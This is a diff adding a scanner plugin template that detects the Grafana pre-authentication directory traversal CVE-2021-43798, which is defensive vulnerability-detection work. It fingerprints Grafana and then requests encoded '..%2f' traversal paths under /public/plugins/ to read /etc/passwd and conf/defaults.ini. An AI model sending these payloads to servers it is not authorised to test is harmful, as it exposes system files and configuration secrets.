@@ -1,0 +1,124 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "GrafanaArbitraryFileReadingDetector"
+  author: "threedr3am (qiaoer1320@gmail.com)"
+  version: "1.0"
+  description: "Detects unauthenticated directory traversal and arbitrary file read in Grafana 8.0.0-beta1 through 8.3.0 (CVE-2021-43798)."
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2021_43798"
+  }
+  severity: HIGH
+  title: "Grafana Pre-Auth Arbitrary File Reading vulnerability (CVE_2021_43798)"
+  description: "In Grafana 8.0.0 to 8.3.0, there is an endpoint that can be accessed without authentication. This endpoint has a directory traversal vulnerability, and any user can read any file on the server without authentication, causing information leakage."
+  recommendation: "Update to 8.3.1 version or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2021-43798"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_grafana"
+  action_phase: ACTION_PHASE_FINGERPRINT
+  http_request: {
+    method: GET
+    uri: [
+      "/public/img/grafana_mask_icon.svg",
+      "/login",
+      "/api/health"
+    ]
+    response: {
+      http_status: 200
+      extract_any: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "(grafana_mask_icon|grafana_icon|grafanaBootData)"
+            variable_name: "grafana_fp"
+          },
+          {
+            from_body: {}
+            regexp: "(\"database\"\\s*:\\s*\"ok\")"
+            variable_name: "grafana_fp"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_plugin_traversal"
+  action_phase: ACTION_PHASE_DETECTION
+  http_request: {
+    method: GET
+    uri: [
+      "/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+      "/public/plugins/grafana/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+      "/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+      "/public/plugins/table/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+      "/public/plugins/timeseries/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+      "/public/plugins/prometheus/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+      "/public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+      "/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini",
+      "/public/plugins/grafana/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini",
+      "/public/plugins/text/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini"
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            header: { name: "Content-Type" }
+            contains: "text/plain"
+          }
+        ]
+      }
+      extract_any: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "(?m)^((?:root|daemon|bin|nobody|grafana):[x*!]:[0-9]+:[0-9]+:[^:\\r\\n]*:/[^:\\r\\n]*:[^:\\r\\n]+)$"
+            variable_name: "file_read_proof"
+          },
+          {
+            from_body: {}
+            regexp: "(?s)(Grafana Configuration Defaults.*\\[paths\\].*\\[server\\].*\\[security\\])"
+            variable_name: "file_read_proof"
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_grafana",
+    "check_plugin_traversal"
+  ]
+}
